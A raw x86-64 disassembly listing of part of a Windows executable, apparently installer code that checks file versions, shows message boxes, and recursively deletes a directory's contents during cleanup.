   140002501:	57                   	push   %rdi
   140002502:	41 54                	push   %r12
   140002504:	41 55                	push   %r13
   140002506:	41 56                	push   %r14
   140002508:	41 57                	push   %r15
   14000250a:	48 8b ec             	mov    %rsp,%rbp
   14000250d:	48 83 ec 48          	sub    $0x48,%rsp
   140002511:	45 33 ff             	xor    %r15d,%r15d
   140002514:	4d 8b e1             	mov    %r9,%r12
   140002517:	4c 8b f2             	mov    %rdx,%r14
   14000251a:	4c 8b e9             	mov    %rcx,%r13
   14000251d:	41 8b ff             	mov    %r15d,%edi
   140002520:	44 89 7d 60          	mov    %r15d,0x60(%rbp)
   140002524:	41 8b df             	mov    %r15d,%ebx
   140002527:	44 89 7d 48          	mov    %r15d,0x48(%rbp)
   14000252b:	4c 89 7d d8          	mov    %r15,-0x28(%rbp)
   14000252f:	44 89 7d 58          	mov    %r15d,0x58(%rbp)
   140002533:	44 39 79 7c          	cmp    %r15d,0x7c(%rcx)
   140002537:	0f 8e c5 01 00 00    	jle    0x140002702
   14000253d:	41 8b c7             	mov    %r15d,%eax
   140002540:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002544:	41 8b b5 80 00 00 00 	mov    0x80(%r13),%esi
   14000254b:	49 8b ce             	mov    %r14,%rcx
   14000254e:	48 03 f0             	add    %rax,%rsi
   140002551:	46 8b 84 2e bc 00 00 	mov    0xbc(%rsi,%r13,1),%r8d
   140002558:	00 
   140002559:	49 81 c0 84 00 00 00 	add    $0x84,%r8
   140002560:	4d 03 c5             	add    %r13,%r8
   140002563:	e8 98 09 00 00       	call   0x140002f00
   140002568:	85 c0                	test   %eax,%eax
   14000256a:	0f 84 ab 01 00 00    	je     0x14000271b
   140002570:	48 8d 55 48          	lea    0x48(%rbp),%rdx
   140002574:	49 8b ce             	mov    %r14,%rcx
   140002577:	48 ff 15 0a 91 00 00 	rex.W call *0x910a(%rip)        # 0x14000b688
   14000257e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002583:	44 8b f0             	mov    %eax,%r14d
   140002586:	85 c0                	test   %eax,%eax
   140002588:	0f 84 44 01 00 00    	je     0x1400026d2
   14000258e:	41 8b d6             	mov    %r14d,%edx
   140002591:	b9 42 00 00 00       	mov    $0x42,%ecx
   140002596:	48 ff 15 73 8d 00 00 	rex.W call *0x8d73(%rip)        # 0x14000b310
   14000259d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400025a2:	48 8b f8             	mov    %rax,%rdi
   1400025a5:	48 85 c0             	test   %rax,%rax
   1400025a8:	0f 84 64 01 00 00    	je     0x140002712
   1400025ae:	48 8b c8             	mov    %rax,%rcx
   1400025b1:	48 ff 15 98 8d 00 00 	rex.W call *0x8d98(%rip)        # 0x14000b350
   1400025b8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400025bd:	4c 8b f8             	mov    %rax,%r15
   1400025c0:	48 85 c0             	test   %rax,%rax
   1400025c3:	0f 84 40 01 00 00    	je     0x140002709
   1400025c9:	8b 55 48             	mov    0x48(%rbp),%edx
   1400025cc:	45 8b c6             	mov    %r14d,%r8d
   1400025cf:	4c 8b 75 50          	mov    0x50(%rbp),%r14
   1400025d3:	4c 8b c8             	mov    %rax,%r9
   1400025d6:	49 8b ce             	mov    %r14,%rcx
   1400025d9:	48 ff 15 b0 90 00 00 	rex.W call *0x90b0(%rip)        # 0x14000b690
   1400025e0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400025e5:	85 c0                	test   %eax,%eax
   1400025e7:	0f 84 d1 00 00 00    	je     0x1400026be
   1400025ed:	4c 8d 4d 60          	lea    0x60(%rbp),%r9
   1400025f1:	49 8b cf             	mov    %r15,%rcx
   1400025f4:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   1400025f8:	48 8d 15 4d 93 00 00 	lea    0x934d(%rip),%rdx        # 0x14000b94c
   1400025ff:	48 ff 15 7a 90 00 00 	rex.W call *0x907a(%rip)        # 0x14000b680
   140002606:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000260b:	45 33 ff             	xor    %r15d,%r15d
   14000260e:	85 c0                	test   %eax,%eax
   140002610:	0f 84 ab 00 00 00    	je     0x1400026c1
   140002616:	44 39 7d 60          	cmp    %r15d,0x60(%rbp)
   14000261a:	0f 84 a1 00 00 00    	je     0x1400026c1
   140002620:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140002624:	49 8d 8d 90 00 00 00 	lea    0x90(%r13),%rcx
   14000262b:	48 03 ce             	add    %rsi,%rcx
   14000262e:	41 8b d7             	mov    %r15d,%edx
   140002631:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   140002635:	44 8b 40 08          	mov    0x8(%rax),%r8d
   140002639:	44 3b 41 f4          	cmp    -0xc(%rcx),%r8d
   14000263d:	73 05                	jae    0x140002644
   14000263f:	83 c8 ff             	or     $0xffffffff,%eax
   140002642:	eb 15                	jmp    0x140002659
   140002644:	76 07                	jbe    0x14000264d
   140002646:	b8 01 00 00 00       	mov    $0x1,%eax
   14000264b:	eb 0c                	jmp    0x140002659
   14000264d:	44 3b 49 f8          	cmp    -0x8(%rcx),%r9d
   140002651:	72 ec                	jb     0x14000263f
   140002653:	41 8b c7             	mov    %r15d,%eax
   140002656:	0f 97 c0             	seta   %al
   140002659:	89 44 15 e0          	mov    %eax,-0x20(%rbp,%rdx,1)
   14000265d:	44 3b 01             	cmp    (%rcx),%r8d
   140002660:	73 05                	jae    0x140002667
   140002662:	83 c8 ff             	or     $0xffffffff,%eax
   140002665:	eb 15                	jmp    0x14000267c
   140002667:	76 07                	jbe    0x140002670
   140002669:	b8 01 00 00 00       	mov    $0x1,%eax
   14000266e:	eb 0c                	jmp    0x14000267c
   140002670:	44 3b 49 04          	cmp    0x4(%rcx),%r9d
   140002674:	72 ec                	jb     0x140002662
   140002676:	41 8b c7             	mov    %r15d,%eax
   140002679:	0f 97 c0             	seta   %al
   14000267c:	89 44 15 e8          	mov    %eax,-0x18(%rbp,%rdx,1)
   140002680:	48 83 c1 18          	add    $0x18,%rcx
   140002684:	48 83 c2 04          	add    $0x4,%rdx
   140002688:	48 83 fa 08          	cmp    $0x8,%rdx
   14000268c:	7c ab                	jl     0x140002639
   14000268e:	44 39 7d e0          	cmp    %r15d,-0x20(%rbp)
   140002692:	7c 06                	jl     0x14000269a
   140002694:	44 39 7d e8          	cmp    %r15d,-0x18(%rbp)
   140002698:	7e 27                	jle    0x1400026c1
   14000269a:	44 39 7d e4          	cmp    %r15d,-0x1c(%rbp)
   14000269e:	7c 06                	jl     0x1400026a6
   1400026a0:	44 39 7d ec          	cmp    %r15d,-0x14(%rbp)
   1400026a4:	7e 1b                	jle    0x1400026c1
   1400026a6:	48 8b cf             	mov    %rdi,%rcx
   1400026a9:	48 ff 15 e0 8c 00 00 	rex.W call *0x8ce0(%rip)        # 0x14000b390
   1400026b0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400026b5:	41 89 1c 24          	mov    %ebx,(%r12)
   1400026b9:	41 8b f7             	mov    %r15d,%esi
   1400026bc:	eb 69                	jmp    0x140002727
   1400026be:	45 33 ff             	xor    %r15d,%r15d
   1400026c1:	48 8b cf             	mov    %rdi,%rcx
   1400026c4:	48 ff 15 c5 8c 00 00 	rex.W call *0x8cc5(%rip)        # 0x14000b390
   1400026cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400026d0:	eb 18                	jmp    0x1400026ea
   1400026d2:	46 39 bc 2e 84 00 00 	cmp    %r15d,0x84(%rsi,%r13,1)
   1400026d9:	00 
   1400026da:	75 3f                	jne    0x14000271b
   1400026dc:	46 39 bc 2e 88 00 00 	cmp    %r15d,0x88(%rsi,%r13,1)
   1400026e3:	00 
   1400026e4:	75 35                	jne    0x14000271b
   1400026e6:	4c 8b 75 50          	mov    0x50(%rbp),%r14
   1400026ea:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400026ee:	ff c3                	inc    %ebx
   1400026f0:	48 83 c0 3c          	add    $0x3c,%rax
   1400026f4:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400026f8:	41 3b 5d 7c          	cmp    0x7c(%r13),%ebx
   1400026fc:	0f 8c 42 fe ff ff    	jl     0x140002544
   140002702:	be 01 00 00 00       	mov    $0x1,%esi
   140002707:	eb 15                	jmp    0x14000271e
   140002709:	8b 75 58             	mov    0x58(%rbp),%esi
   14000270c:	41 89 1c 24          	mov    %ebx,(%r12)
   140002710:	eb 15                	jmp    0x140002727
   140002712:	8b 75 58             	mov    0x58(%rbp),%esi
   140002715:	41 89 1c 24          	mov    %ebx,(%r12)
   140002719:	eb 1b                	jmp    0x140002736
   14000271b:	8b 75 58             	mov    0x58(%rbp),%esi
   14000271e:	41 89 1c 24          	mov    %ebx,(%r12)
   140002722:	48 85 ff             	test   %rdi,%rdi
   140002725:	74 0f                	je     0x140002736
   140002727:	48 8b cf             	mov    %rdi,%rcx
   14000272a:	48 ff 15 e7 8b 00 00 	rex.W call *0x8be7(%rip)        # 0x14000b318
   140002731:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002736:	8b c6                	mov    %esi,%eax
   140002738:	48 83 c4 48          	add    $0x48,%rsp
   14000273c:	41 5f                	pop    %r15
   14000273e:	41 5e                	pop    %r14
   140002740:	41 5d                	pop    %r13
   140002742:	41 5c                	pop    %r12
   140002744:	5f                   	pop    %rdi
   140002745:	5e                   	pop    %rsi
   140002746:	5b                   	pop    %rbx
   140002747:	5d                   	pop    %rbp
   140002748:	c3                   	ret
   140002749:	cc                   	int3
   14000274a:	cc                   	int3
   14000274b:	cc                   	int3
   14000274c:	cc                   	int3
   14000274d:	cc                   	int3
   14000274e:	cc                   	int3
   14000274f:	cc                   	int3
   140002750:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002755:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000275a:	56                   	push   %rsi
   14000275b:	57                   	push   %rdi
   14000275c:	41 56                	push   %r14
   14000275e:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140002765:	48 8b 05 14 b9 00 00 	mov    0xb914(%rip),%rax        # 0x14000e080
   14000276c:	48 33 c4             	xor    %rsp,%rax
   14000276f:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140002774:	33 ed                	xor    %ebp,%ebp
   140002776:	66 c7 44 24 6c 00 05 	movw   $0x500,0x6c(%rsp)
   14000277d:	4c 8b f1             	mov    %rcx,%r14
   140002780:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140002785:	48 8d 0d ac 90 00 00 	lea    0x90ac(%rip),%rcx        # 0x14000b838
   14000278c:	89 6c 24 68          	mov    %ebp,0x68(%rsp)
   140002790:	8b fd                	mov    %ebp,%edi
   140002792:	48 ff 15 67 8b 00 00 	rex.W call *0x8b67(%rip)        # 0x14000b300
   140002799:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000279e:	48 8b d8             	mov    %rax,%rbx
   1400027a1:	48 85 c0             	test   %rax,%rax
   1400027a4:	0f 84 99 00 00 00    	je     0x140002843
   1400027aa:	48 8d 15 97 90 00 00 	lea    0x9097(%rip),%rdx        # 0x14000b848
   1400027b1:	48 8b c8             	mov    %rax,%rcx
   1400027b4:	48 ff 15 8d 8b 00 00 	rex.W call *0x8b8d(%rip)        # 0x14000b348
   1400027bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400027c0:	48 8b f0             	mov    %rax,%rsi
   1400027c3:	48 85 c0             	test   %rax,%rax
   1400027c6:	74 6c                	je     0x140002834
   1400027c8:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400027cd:	41 89 2e             	mov    %ebp,(%r14)
   1400027d0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400027d5:	44 8d 45 20          	lea    0x20(%rbp),%r8d
   1400027d9:	89 6c 24 48          	mov    %ebp,0x48(%rsp)
   1400027dd:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400027e2:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   1400027e6:	8d 7d 01             	lea    0x1(%rbp),%edi
   1400027e9:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   1400027ed:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   1400027f3:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   1400027f7:	b2 02                	mov    $0x2,%dl
   1400027f9:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   1400027fd:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140002801:	48 ff 15 38 8a 00 00 	rex.W call *0x8a38(%rip)        # 0x14000b240
   140002808:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000280d:	85 c0                	test   %eax,%eax
   14000280f:	74 23                	je     0x140002834
   140002811:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140002816:	4d 8b c6             	mov    %r14,%r8
   140002819:	33 c9                	xor    %ecx,%ecx
   14000281b:	48 8b c6             	mov    %rsi,%rax
   14000281e:	e8 ed 77 00 00       	call   0x14000a010
   140002823:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002828:	48 ff 15 e9 89 00 00 	rex.W call *0x89e9(%rip)        # 0x14000b218
   14000282f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002834:	48 8b cb             	mov    %rbx,%rcx
   140002837:	48 ff 15 2a 8b 00 00 	rex.W call *0x8b2a(%rip)        # 0x14000b368
   14000283e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002843:	8b c7                	mov    %edi,%eax
   140002845:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000284a:	48 33 cc             	xor    %rsp,%rcx
   14000284d:	e8 5e 73 00 00       	call   0x140009bb0
   140002852:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140002859:	00 
   14000285a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000285e:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140002862:	49 8b e3             	mov    %r11,%rsp
   140002865:	41 5e                	pop    %r14
   140002867:	5f                   	pop    %rdi
   140002868:	5e                   	pop    %rsi
   140002869:	c3                   	ret
   14000286a:	cc                   	int3
   14000286b:	cc                   	int3
   14000286c:	cc                   	int3
   14000286d:	cc                   	int3
   14000286e:	cc                   	int3
   14000286f:	cc                   	int3
   140002870:	cc                   	int3
   140002871:	cc                   	int3
   140002872:	cc                   	int3
   140002873:	cc                   	int3
   140002874:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002879:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000287e:	55                   	push   %rbp
   14000287f:	57                   	push   %rdi
   140002880:	41 57                	push   %r15
   140002882:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140002889:	ff 
   14000288a:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140002891:	48 8b 05 e8 b7 00 00 	mov    0xb7e8(%rip),%rax        # 0x14000e080
   140002898:	48 33 c4             	xor    %rsp,%rax
   14000289b:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   1400028a2:	48 8b d9             	mov    %rcx,%rbx
   1400028a5:	33 d2                	xor    %edx,%edx
   1400028a7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400028ac:	41 b8 40 01 00 00    	mov    $0x140,%r8d
   1400028b2:	e8 ef f2 ff ff       	call   0x140001ba6
   1400028b7:	48 85 db             	test   %rbx,%rbx
   1400028ba:	0f 84 96 01 00 00    	je     0x140002a56
   1400028c0:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400028c3:	0f 84 8d 01 00 00    	je     0x140002a56
   1400028c9:	41 bf 04 01 00 00    	mov    $0x104,%r15d
   1400028cf:	48 8d 45 60          	lea    0x60(%rbp),%rax
   1400028d3:	48 8b fb             	mov    %rbx,%rdi
   1400028d6:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400028da:	41 8b d7             	mov    %r15d,%edx
   1400028dd:	48 2b f8             	sub    %rax,%rdi
   1400028e0:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400028e7:	48 85 c0             	test   %rax,%rax
   1400028ea:	74 12                	je     0x1400028fe
   1400028ec:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   1400028ef:	84 c0                	test   %al,%al
   1400028f1:	74 0b                	je     0x1400028fe
   1400028f3:	88 01                	mov    %al,(%rcx)
   1400028f5:	48 ff c1             	inc    %rcx
   1400028f8:	48 83 ea 01          	sub    $0x1,%rdx
   1400028fc:	75 e2                	jne    0x1400028e0
   1400028fe:	48 85 d2             	test   %rdx,%rdx
   140002901:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140002905:	4c 8d 05 ec 8f 00 00 	lea    0x8fec(%rip),%r8        # 0x14000b8f8
   14000290c:	49 8b d7             	mov    %r15,%rdx
   14000290f:	48 0f 45 c1          	cmovne %rcx,%rax
   140002913:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002917:	c6 00 00             	movb   $0x0,(%rax)
   14000291a:	e8 65 0e 00 00       	call   0x140003784
   14000291f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002924:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002928:	48 ff 15 31 8c 00 00 	rex.W call *0x8c31(%rip)        # 0x14000b560
   14000292f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002934:	48 8b f0             	mov    %rax,%rsi
   140002937:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000293b:	0f 84 15 01 00 00    	je     0x140002a56
   140002941:	4d 8b c7             	mov    %r15,%r8
   140002944:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140002948:	49 8d 88 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rcx
   14000294f:	48 85 c9             	test   %rcx,%rcx
   140002952:	74 12                	je     0x140002966
   140002954:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   140002957:	84 c0                	test   %al,%al
   140002959:	74 0b                	je     0x140002966
   14000295b:	88 02                	mov    %al,(%rdx)
   14000295d:	48 ff c2             	inc    %rdx
   140002960:	49 83 e8 01          	sub    $0x1,%r8
   140002964:	75 e2                	jne    0x140002948
   140002966:	4d 85 c0             	test   %r8,%r8
   140002969:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000296d:	48 0f 45 c2          	cmovne %rdx,%rax
   140002971:	f6 44 24 20 10       	testb  $0x10,0x20(%rsp)
   140002976:	c6 00 00             	movb   $0x0,(%rax)
   140002979:	74 6b                	je     0x1400029e6
   14000297b:	48 8d 15 7a 8f 00 00 	lea    0x8f7a(%rip),%rdx        # 0x14000b8fc
   140002982:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140002987:	48 ff 15 3a 8a 00 00 	rex.W call *0x8a3a(%rip)        # 0x14000b3c8
   14000298e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002993:	85 c0                	test   %eax,%eax
   140002995:	0f 84 81 00 00 00    	je     0x140002a1c
   14000299b:	48 8d 15 5e 8f 00 00 	lea    0x8f5e(%rip),%rdx        # 0x14000b900
   1400029a2:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   1400029a7:	48 ff 15 1a 8a 00 00 	rex.W call *0x8a1a(%rip)        # 0x14000b3c8
   1400029ae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400029b3:	85 c0                	test   %eax,%eax
   1400029b5:	74 65                	je     0x140002a1c
   1400029b7:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   1400029bc:	49 8b d7             	mov    %r15,%rdx
   1400029bf:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400029c3:	e8 bc 0d 00 00       	call   0x140003784
   1400029c8:	4c 8d 05 61 8e 00 00 	lea    0x8e61(%rip),%r8        # 0x14000b830
   1400029cf:	41 8b d7             	mov    %r15d,%edx
   1400029d2:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400029d6:	e8 01 6c 00 00       	call   0x1400095dc
   1400029db:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400029df:	e8 90 fe ff ff       	call   0x140002874
   1400029e4:	eb 36                	jmp    0x140002a1c
   1400029e6:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   1400029eb:	49 8b d7             	mov    %r15,%rdx
   1400029ee:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400029f2:	e8 8d 0d 00 00       	call   0x140003784
   1400029f7:	ba 80 00 00 00       	mov    $0x80,%edx
   1400029fc:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002a00:	48 ff 15 39 89 00 00 	rex.W call *0x8939(%rip)        # 0x14000b340
   140002a07:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a0c:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002a10:	48 ff 15 f1 88 00 00 	rex.W call *0x88f1(%rip)        # 0x14000b308
   140002a17:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a1c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002a21:	48 8b ce             	mov    %rsi,%rcx
   140002a24:	48 ff 15 25 8b 00 00 	rex.W call *0x8b25(%rip)        # 0x14000b550
   140002a2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a30:	85 c0                	test   %eax,%eax
   140002a32:	0f 85 09 ff ff ff    	jne    0x140002941
   140002a38:	48 8b ce             	mov    %rsi,%rcx
   140002a3b:	48 ff 15 06 8b 00 00 	rex.W call *0x8b06(%rip)        # 0x14000b548
   140002a42:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a47:	48 8b cb             	mov    %rbx,%rcx
   140002a4a:	48 ff 15 0f 89 00 00 	rex.W call *0x890f(%rip)        # 0x14000b360
   140002a51:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a56:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   140002a5d:	48 33 cc             	xor    %rsp,%rcx
   140002a60:	e8 4b 71 00 00       	call   0x140009bb0
   140002a65:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   140002a6c:	00 
   140002a6d:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140002a71:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140002a75:	49 8b e3             	mov    %r11,%rsp
   140002a78:	41 5f                	pop    %r15
   140002a7a:	5f                   	pop    %rdi
   140002a7b:	5d                   	pop    %rbp
   140002a7c:	c3                   	ret
   140002a7d:	cc                   	int3
   140002a7e:	cc                   	int3
   140002a7f:	cc                   	int3
   140002a80:	cc                   	int3
   140002a81:	cc                   	int3
   140002a82:	cc                   	int3
   140002a83:	cc                   	int3
   140002a84:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a89:	57                   	push   %rdi
   140002a8a:	48 83 ec 50          	sub    $0x50,%rsp
   140002a8e:	48 8b 05 eb b5 00 00 	mov    0xb5eb(%rip),%rax        # 0x14000e080
   140002a95:	48 33 c4             	xor    %rsp,%rax
   140002a98:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002a9d:	33 db                	xor    %ebx,%ebx
   140002a9f:	c7 05 db cb 00 00 70 	movl   $0x70,0xcbdb(%rip)        # 0x14000f684
   140002aa6:	00 00 00 
   140002aa9:	49 8b f9             	mov    %r9,%rdi
   140002aac:	83 f9 01             	cmp    $0x1,%ecx
   140002aaf:	75 3d                	jne    0x140002aee
   140002ab1:	45 8d 0c 10          	lea    (%r8,%rdx,1),%r9d
   140002ab5:	4c 8d 05 58 8e 00 00 	lea    0x8e58(%rip),%r8        # 0x14000b914
   140002abc:	8d 53 0a             	lea    0xa(%rbx),%edx
   140002abf:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002ac4:	e8 7f 0d 00 00       	call   0x140003848
   140002ac9:	21 5c 24 28          	and    %ebx,0x28(%rsp)
   140002acd:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002ad2:	45 33 c9             	xor    %r9d,%r9d
   140002ad5:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002adc:	00 
   140002add:	ba fa 04 00 00       	mov    $0x4fa,%edx
   140002ae2:	33 c9                	xor    %ecx,%ecx
   140002ae4:	e8 ef 38 00 00       	call   0x1400063d8
   140002ae9:	e9 98 00 00 00       	jmp    0x140002b86
   140002aee:	83 f9 04             	cmp    $0x4,%ecx
   140002af1:	75 44                	jne    0x140002b37
   140002af3:	45 8d 0c 10          	lea    (%r8,%rdx,1),%r9d
   140002af7:	8d 51 06             	lea    0x6(%rcx),%edx
   140002afa:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002aff:	4c 8d 05 0e 8e 00 00 	lea    0x8e0e(%rip),%r8        # 0x14000b914
   140002b06:	e8 3d 0d 00 00       	call   0x140003848
   140002b0b:	45 33 c9             	xor    %r9d,%r9d
   140002b0e:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   140002b15:	00 
   140002b16:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002b1b:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140002b22:	00 
   140002b23:	ba bd 04 00 00       	mov    $0x4bd,%edx
   140002b28:	33 c9                	xor    %ecx,%ecx
   140002b2a:	e8 a9 38 00 00       	call   0x1400063d8
   140002b2f:	83 f8 04             	cmp    $0x4,%eax
   140002b32:	0f 94 c3             	sete   %bl
   140002b35:	eb 4f                	jmp    0x140002b86
   140002b37:	83 f9 02             	cmp    $0x2,%ecx
   140002b3a:	75 4a                	jne    0x140002b86
   140002b3c:	45 8b c8             	mov    %r8d,%r9d
   140002b3f:	8d 51 08             	lea    0x8(%rcx),%edx
   140002b42:	4c 8d 05 cb 8d 00 00 	lea    0x8dcb(%rip),%r8        # 0x14000b914
   140002b49:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b4e:	e8 f5 0c 00 00       	call   0x140003848
   140002b53:	4c 8b cf             	mov    %rdi,%r9
   140002b56:	c7 44 24 28 04 01 00 	movl   $0x104,0x28(%rsp)
   140002b5d:	00 
   140002b5e:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002b63:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002b6a:	00 
   140002b6b:	ba cc 04 00 00       	mov    $0x4cc,%edx
   140002b70:	33 c9                	xor    %ecx,%ecx
   140002b72:	e8 61 38 00 00       	call   0x1400063d8
   140002b77:	83 f8 06             	cmp    $0x6,%eax
   140002b7a:	75 0a                	jne    0x140002b86
   140002b7c:	83 25 01 cb 00 00 00 	andl   $0x0,0xcb01(%rip)        # 0x14000f684
   140002b83:	8d 58 fb             	lea    -0x5(%rax),%ebx
   140002b86:	8b c3                	mov    %ebx,%eax
   140002b88:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002b8d:	48 33 cc             	xor    %rsp,%rcx
   140002b90:	e8 1b 70 00 00       	call   0x140009bb0
   140002b95:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140002b9a:	48 83 c4 50          	add    $0x50,%rsp
   140002b9e:	5f                   	pop    %rdi
   140002b9f:	c3                   	ret
   140002ba0:	cc                   	int3
   140002ba1:	cc                   	int3
   140002ba2:	cc                   	int3
   140002ba3:	cc                   	int3
   140002ba4:	cc                   	int3
   140002ba5:	cc                   	int3
   140002ba6:	cc                   	int3
   140002ba7:	cc                   	int3
   140002ba8:	48 83 ec 38          	sub    $0x38,%rsp
   140002bac:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140002bb1:	4c 8d 05 78 8c 00 00 	lea    0x8c78(%rip),%r8        # 0x14000b830
   140002bb8:	45 33 c9             	xor    %r9d,%r9d
   140002bbb:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002bc2:	00 
   140002bc3:	ba 21 05 00 00       	mov    $0x521,%edx
   140002bc8:	33 c9                	xor    %ecx,%ecx
   140002bca:	e8 09 38 00 00       	call   0x1400063d8
   140002bcf:	48 83 c4 38          	add    $0x38,%rsp
   140002bd3:	c3                   	ret
   140002bd4:	cc                   	int3
   140002bd5:	cc                   	int3
   140002bd6:	cc                   	int3
   140002bd7:	cc                   	int3
   140002bd8:	cc                   	int3
   140002bd9:	cc                   	int3
   140002bda:	cc                   	int3
   140002bdb:	cc                   	int3
   140002bdc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002be1:	56                   	push   %rsi
   140002be2:	57                   	push   %rdi
   140002be3:	41 56                	push   %r14
   140002be5:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002bec:	48 8b 05 8d b4 00 00 	mov    0xb48d(%rip),%rax        # 0x14000e080
   140002bf3:	48 33 c4             	xor    %rsp,%rax
   140002bf6:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140002bfd:	00 
   140002bfe:	c6 02 00             	movb   $0x0,(%rdx)
   140002c01:	48 8b f2             	mov    %rdx,%rsi
   140002c04:	48 8b f9             	mov    %rcx,%rdi
   140002c07:	48 8b da             	mov    %rdx,%rbx
   140002c0a:	48 85 c9             	test   %rcx,%rcx
   140002c0d:	0f 84 25 02 00 00    	je     0x140002e38
   140002c13:	80 39 00             	cmpb   $0x0,(%rcx)
   140002c16:	0f 84 1c 02 00 00    	je     0x140002e38
   140002c1c:	48 8b 0d 8d d3 00 00 	mov    0xd38d(%rip),%rcx        # 0x14000ffb0
